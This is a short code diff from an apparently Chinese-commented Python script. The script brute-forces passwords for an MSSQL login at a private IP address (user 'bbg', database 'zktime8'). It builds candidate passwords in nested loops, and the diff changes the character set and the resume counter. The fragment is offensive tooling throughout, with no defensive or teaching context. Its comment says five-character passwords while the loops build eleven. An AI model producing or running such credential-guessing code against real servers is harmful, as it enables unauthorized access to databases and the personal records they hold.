@@ -68,7 +68,7 @@ class MSSQL:
 
 def main():
     # 密码字符集
-    charset = string.printable[:-38]
+    charset = string.printable[:-64]
     # 5位密码
     i = 0
     for ch1 in range(len(charset)):
@@ -87,7 +87,7 @@ def main():
                                                     charset[ch6]) + str(charset[ch7]) + str(charset[ch8]) + str(
                                                     charset[ch9]) + str(charset[ch10]) + str(charset[ch11])
                                                 i += 1
-                                                if i >= 1000000000:  # 断点
+                                                if i >= 9999999999:  # 断点
                                                     try:
                                                         ms = MSSQL(host="192.168.2.228", user="bbg", pwd=password,
                                                                    db="zktime8")
